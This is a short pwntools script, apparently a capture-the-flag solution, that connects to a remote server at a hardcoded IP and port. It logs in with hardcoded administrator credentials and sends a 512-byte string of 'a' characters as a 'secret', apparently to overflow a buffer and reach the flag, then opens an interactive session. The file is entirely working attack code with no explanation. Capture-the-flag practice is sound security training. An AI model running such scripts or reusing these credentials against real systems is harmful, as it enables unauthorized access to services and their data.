from pwn import *

exe = context.binary = ELF('./cat', checksec=False)

# r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
           
#            ''')

r = remote('159.89.197.210', 9994)

r.sendafter(b'Username: ', b'KCSC_4dm1n1str4t0r')
r.sendafter(b'Password: ', b'wh3r3_1s_th3_fl4g')
r.sendafter(b'secret: ', b'a'*512)

r.interactive()